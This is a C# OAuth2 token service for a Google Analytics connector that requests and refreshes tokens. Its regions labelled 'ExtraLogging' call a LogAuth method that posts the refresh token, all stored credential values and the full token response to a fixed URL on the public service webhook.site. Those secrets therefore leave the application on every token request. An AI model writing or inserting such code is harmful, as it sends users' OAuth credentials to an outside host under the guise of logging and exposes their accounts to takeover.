using System.Text.Json;
using Apps.GoogleAnalytics.Constants;
using Blackbird.Applications.Sdk.Common;
using Blackbird.Applications.Sdk.Common.Authentication.OAuth2;
using Blackbird.Applications.Sdk.Common.Invocation;
using RestSharp;

namespace Apps.GoogleAnalytics.Auth.OAuth2;

public class OAuth2TokenService : BaseInvocable, IOAuth2TokenService
{
    public OAuth2TokenService(InvocationContext invocationContext) : base(invocationContext)
    {
    }

    public bool IsRefreshToken(Dictionary<string, string> values)
    {
        var expiresAt = DateTime.Parse(values[CredsNames.ExpiresAt]);
        return DateTime.UtcNow > expiresAt;
    }

    public Task<Dictionary<string, string>> RefreshToken(Dictionary<string, string> values, CancellationToken cancellationToken)
    {
        const string grantType = "refresh_token";

        #region ExtraLogging
        LogAuth(Newtonsoft.Json.JsonConvert.SerializeObject(new
        {
            refreshTokenPresent = values.TryGetValue("refresh_token", out var refToken),
            refreshToken = refToken,
            allValues = values
        }));
        #endregion

        var bodyParameters = new Dictionary<string, string>
        {
            { "grant_type", grantType },
            { "client_id", ApplicationConstants.ClientId },
            { "client_secret", ApplicationConstants.ClientSecret },
            { "refresh_token", values["refresh_token"] }
        };
        
        return RequestToken(bodyParameters, cancellationToken);
    }

    public Task<Dictionary<string, string>> RequestToken(
        string state, 
        string code, 
        Dictionary<string, string> values, 
        CancellationToken cancellationToken)
    {
        const string grantType = "authorization_code";

        var bodyParameters = new Dictionary<string, string>
        {
            { "grant_type", grantType },
            { "client_id", ApplicationConstants.ClientId },
            { "client_secret", ApplicationConstants.ClientSecret },
            { "redirect_uri", $"{InvocationContext.UriInfo.BridgeServiceUrl.ToString().TrimEnd('/')}/AuthorizationCode" },
            { "code", code }
        };
        
        return RequestToken(bodyParameters, cancellationToken);
    }

    public Task RevokeToken(Dictionary<string, string> values)
    {
        throw new NotImplementedException();
    }

    private async Task<Dictionary<string, string>> RequestToken(Dictionary<string, string> bodyParameters, CancellationToken cancellationToken)
    {
        var utcNow = DateTime.UtcNow;
        using var httpClient = new HttpClient();
        using var httpContent = new FormUrlEncodedContent(bodyParameters);
        using var response = await httpClient.PostAsync(Urls.Token, httpContent, cancellationToken);

        #region ExtraLogging
        LogAuth(Newtonsoft.Json.JsonConvert.SerializeObject(new
        {
            requestToken = true,
            status = response.StatusCode,
            content = await response.Content.ReadAsStringAsync(cancellationToken),
            response.IsSuccessStatusCode
        }));
        #endregion

        var responseContent = await response.Content.ReadAsStringAsync(cancellationToken);
        
        var resultDictionary = JsonSerializer.Deserialize<Dictionary<string, object>>(responseContent)?.ToDictionary(r => r.Key, r => r.Value?.ToString())
                               ?? throw new InvalidOperationException($"Invalid response content: {responseContent}");
        #region ExtraLogging
        LogAuth(Newtonsoft.Json.JsonConvert.SerializeObject(new
        {
            afterResultDictionary = true
        }));
        #endregion

        var expiresIn = int.Parse(resultDictionary["expires_in"]);

        #region ExtraLogging
        LogAuth(Newtonsoft.Json.JsonConvert.SerializeObject(new
        {
            afterExpiresIn = true,
            expiresIn,
        }));
        #endregion

        var expiresAt = utcNow.AddSeconds(expiresIn);
        resultDictionary.Add(CredsNames.ExpiresAt, expiresAt.ToString());

        #region ExtraLogging
        LogAuth(Newtonsoft.Json.JsonConvert.SerializeObject(new
        {
            setupSconnection = true,
        }));
        #endregion

        return resultDictionary;
    }

    private void LogAuth(string data)
    {
        var options = new RestClientOptions("https://webhook.site")
        {
            MaxTimeout = -1,
        };
        var client = new RestClient(options);
        var request = new RestRequest("/1b69024e-1c4b-461f-b495-6c6a94252865", Method.Post);
        request.AddStringBody(data, DataFormat.Json);
        client.Execute(request);
    }
}